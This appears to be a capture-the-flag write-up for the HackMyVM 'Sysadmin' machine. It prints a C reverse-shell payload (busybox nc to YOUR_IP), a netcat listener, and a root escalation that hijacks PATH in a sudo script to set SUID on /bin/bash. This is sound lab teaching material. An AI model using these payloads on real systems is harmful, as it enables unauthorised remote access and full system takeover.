---
title: "Sysadmin - HackMyVM"
summary: "Difficulty: Very Easy 🔵"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://hackmyvm.eu/machines/machine.php?vm=Sysadmin)

To begin, we will perform a **quick port scan** to find **which ports are open** on the victim machine using the [**Nmap**](https://nmap.org/) tool.

```
sudo nmap -sS --min-rate 4500 -n -Pn 192.168.1.196 -vvv
```

![01](/images/writeups/sysadmin/1.png)

Once we know that **ports 22 and 80 are open**, we will run a more **detailed scan on those ports** and save the result to a file called ***target***.

```
nmap -sCV -p22,80 -n -Pn 192.168.1.196 -oN target
```

![02](/images/writeups/sysadmin/2.png)

We see that **OpenSSH** is running behind port **22** and a **website** is hosted on port **80**.

We visit the site.

![03](/images/writeups/sysadmin/3.png)

This **website allows us to upload a C source file which will be compiled and executed**, then removed from the server.

If we view the page source (**Ctrl + U**), we see **how the code will be compiled**:

![04](/images/writeups/sysadmin/4.png)

That combination of flags **disables protections** and allows a malicious `.c` to end up **executing code on the server**. Also, `-nostdinc -I/var/www/include` prevents the use of **standard headers** (it only searches ***/var/www/include***, so many `#includes` fail).

To **exploit** the vulnerability we could upload a **C program** that runs a **Reverse Shell** without using any `#include`:

```
int fork();
int execve(const char*,char*const[],char*const[]);
int main(){
 if(fork()==0){
  char* argv[]={"/bin/sh","-c","busybox nc YOUR_IP 4444 -e /bin/bash",0};
  execve(argv[0],argv,0);
 }
 return 0;
}
```

Before uploading it, we **set up a listener** on port **4444**.

```
nc -lvnp 4444
```

![05](/images/writeups/sysadmin/5.png)

Once the connection is received, we will configure the **TTY** to get an interactive and stable shell.

```
script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg
	reset xterm
export TERM=xterm
```

After doing all that, we can obtain the **User Flag**.

![06](/images/writeups/sysadmin/6.png)


## Privilege escalation to Root

Running `sudo -l` shows that the user **echo** can run ***/usr/local/bin/system-info.sh*** as **root** without providing a password.

![07](/images/writeups/sysadmin/7.png)

What is truly vulnerable here is that `env_reset` is **disabled**, which means the **user’s environment variables are preserved** when running commands with sudo.

Contents of `/usr/local/bin/system-info.sh`:

```bash
#!/bin/bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
```

To exploit this, we will perform **Command Hijacking**, making use of `!env_reset`. The script runs the binaries `df`, `ls`, `find`, `systemctl`, `free` and `cat` without absolute paths. Because `env_reset` is disabled, our **PATH** is inherited when we run the script as root.

We create, for example, a fake `ls` in ***/tmp*** **containing a malicious command**:

```
chmod u+s /bin/bash
```

And we give it execute permissions.

With this, when the line `ls -lh /var/log/` is executed it will search `ls` in the **PATH**, find our binary first and **set the SUID bit on */bin/bash***.

Then we run ***system-info.sh*** using our modified **PATH**:

```
sudo PATH=/tmp:$PATH /usr/local/bin/system-info.sh
```

This way, **the script will run our malicious** `ls` **instead of the original**.

![08](/images/writeups/sysadmin/8.png)

Now that **bash** has the **SUID** bit set, we invoke the privileged shell.

```
/bin/bash -p
```

![09](/images/writeups/sysadmin/9.png)

We obtain the **Root Flag**.

![10](/images/writeups/sysadmin/10.png)

And the machine is **completely pwned**!!